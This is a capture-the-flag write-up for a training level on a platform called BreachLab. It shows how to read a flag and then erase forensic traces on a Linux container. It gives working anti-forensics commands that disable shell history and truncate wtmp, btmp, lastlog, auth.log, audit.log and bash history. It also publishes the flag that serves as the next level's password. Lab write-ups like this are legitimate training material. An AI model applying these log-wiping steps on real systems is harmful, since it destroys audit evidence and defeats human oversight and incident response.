# BreachLab - Phantom Track: Level 15 (Clean Slate)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 15 (Clean Slate)
- **Host:** `204.168.229.209`
- **Port:** `2224` *(Ephemeral Container Environment)*
- **Current User:** `phantom15`
- **Goal:** Read `/root/clean_flag`, eradicate all operational forensic footprints across Linux authentication, system accounting, kernel audit, and shell history logs, and pass verification via `/opt/verify-clean.sh`
- **Next User / Flag Code:** `bl_phtm15_dff3f4f5c135d12f`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
━━━ phantom-deep · ephemeral session ━━━
  L15 — Clean Slate
  This container is yours alone. Destroyed on disconnect.
  Mission brief: cat ~/BRIEFING
  Verifier: /opt/verify-*.sh

MISSION: Clean Slate
===================

You compromised this box. Now erase every trace.

An investigator will read the standard operator-trail
categories: SSH records, login records, failed-login records,
your shell history, filesystem audit records. Find what you
can touch. Erase your presence.

Flag first: /root/clean_flag — then clean up.

Run /opt/verify-clean.sh when you think you are clean.
```

The objective is to read the step flag from `/root/clean_flag`, leverage group write permissions (`ops_logs`) over system log files, purge all traces across multi-dimensional Linux accounting/logging facilities, and achieve zero forensic traces evaluated by `/opt/verify-clean.sh`.

---

## 2. Reconnaissance & Privilege Auditing

Reading the initial step flag using quiet builtins:

```bash
phantom15@5fae2860e46e:~$ mapfile FLAG < /root/clean_flag && printf '%s\n' "${FLAG[@]}"
[PHANTOM-L15-READ-STEP-COMPLETE-NOW-CLEAN-UP-2026]
```

### Auditing User Privileges & Group Permissions

```bash
phantom15@5fae2860e46e:~$ id
uid=1022(phantom15) gid=1022(phantom15) groups=1022(phantom15),1024(ops_flag14),1025(ops_logs)
```

Searching for log files owned by group `ops_logs` (`GID 1025`):

```bash
phantom15@5fae2860e46e:~$ find /var/log -group ops_logs -ls 2>/dev/null
  2048660      0 -rw-rw----   1 root     ops_logs        0 Jun  6 17:48 /var/log/btmp
  2048661      0 -rw-rw----   1 root     ops_logs   300176 Jun  6 17:38 /var/log/lastlog
  2048663      0 -rw-rw----   1 root     ops_logs      384 Jun  6 17:38 /var/log/wtmp
  2048657      8 drwxr-x---   1 root     ops_logs     4096 May 23 18:57 /var/log/audit
  2048658      4 -rw-rw----   1 root     ops_logs      864 Jun  6 17:37 /var/log/audit/audit.log
  2048659      4 -rw-rw----   1 root     ops_logs     1059 Jun  6 17:37 /var/log/auth.log
  2048662      0 -rw-rw----   1 root     ops_logs        0 May 23 18:57 /var/log/syslog
```

---

## 3. Forensic Artifact Matrix

| Artifact Path | Format | Description / Associated Investigative Tool |
| :--- | :--- | :--- |
| `/var/log/wtmp` | Binary utmp struct | Historical record of successful user logins/logouts (`last`). |
| `/var/log/btmp` | Binary utmp struct | Historical record of failed/bad login attempts (`lastb`). |
| `/var/log/lastlog` | Binary sparse struct | Index of last login timestamps and TTY per UID (`lastlog`). |
| `/var/log/auth.log` | Plaintext syslog | Authentication events (`sshd`, PAM session open/close, `sudo`). |
| `/var/log/audit/audit.log` | Plaintext audit | Kernel audit daemon records (`auditd`, syscalls, `execve`). |
| `~/.bash_history` | Plaintext history | Persisted shell command log for the user session. |

---

## 4. Execution Protocol: Systematic Anti-Forensic Cleanup

### Step 1: Freezing Shell History Recording

Before executing cleaning commands, disable shell logging to avoid recording cleanup activity:

```bash
phantom15@5fae2860e46e:~$ unset HISTFILE
phantom15@5fae2860e46e:~$ set +o history
```

### Step 2: Zero-Byte Truncation (Preserving Inodes & Descriptors)

Rather than deleting files with `rm` (which destroys file descriptors and triggers daemon alerts), truncate the log files in place:

```bash
phantom15@5fae2860e46e:~$ > /var/log/wtmp
phantom15@5fae2860e46e:~$ > /var/log/lastlog
phantom15@5fae2860e46e:~$ > /var/log/btmp
phantom15@5fae2860e46e:~$ > /var/log/auth.log
phantom15@5fae2860e46e:~$ > /var/log/audit/audit.log
```

### Step 3: Wiping Persistent & Volatile History

Clear both disk-persisted history and current in-memory RAM history buffers:

```bash
phantom15@5fae2860e46e:~$ > ~/.bash_history
phantom15@5fae2860e46e:~$ history -c
```

---

## 5. Verification & Flag Extraction

Running the forensic evaluation script:

```bash
phantom15@5fae2860e46e:~$ /opt/verify-clean.sh
[*] Forensic investigation in progress...

[+] auth.log: CLEAN
[+] wtmp: CLEAN
[+] btmp: CLEAN
[+] bash_history: CLEAN
[+] audit.log: CLEAN
[+] lastlog: CLEAN

[*] Zero traces found. Perfect cleanup.

[*] FLAG: bl_phtm15_dff3f4f5c135d12f
[*] Use this as the password for phantom16.
```

- **Extracted Flag:** `bl_phtm15_dff3f4f5c135d12f`

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 15) |
| **Current User** | `phantom15` |
| **Privileged Group** | `ops_logs` (GID 1025) |
| **Focus** | Multi-Layer Anti-Forensics & Log Wiping |
| **Artifacts Sanitized** | `wtmp`, `btmp`, `lastlog`, `auth.log`, `audit.log`, `bash_history` |
| **Discovered Flag** | `bl_phtm15_dff3f4f5c135d12f` |
| **Next Target Access** | `phantom16` Password |

---

## 7. Key Commands & Concepts Reference

- `unset HISTFILE; set +o history`: Immediately disable bash history logging for the active session.
- `> /path/to/logfile`: Truncate file to zero bytes while preserving inode number, ownership, and open daemon file descriptors.
- `history -c`: Flush the interactive shell history buffer held in RAM.
- `find /var/log -group <group> -ls`: Enumerate group-accessible log files across the filesystem.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Order of Operations in Anti-Forensics:** Shell history recording must be disabled *prior* to executing cleanup routines; otherwise, the cleanup commands themselves generate self-incriminating log entries.
2. **Truncation over Deletion:** Deleting log files with `rm` breaks daemon logging pipelines and creates conspicuous filesystem gap anomalies. Truncating (`> file`) keeps permissions and descriptors intact.
3. **Multi-Source Forensic Correlation:** Incident responders cross-reference network authentication (`auth.log`), system accounting (`wtmp`/`lastlog`), and kernel telemetry (`audit.log`). Complete cleanup requires addressing all logging tiers.
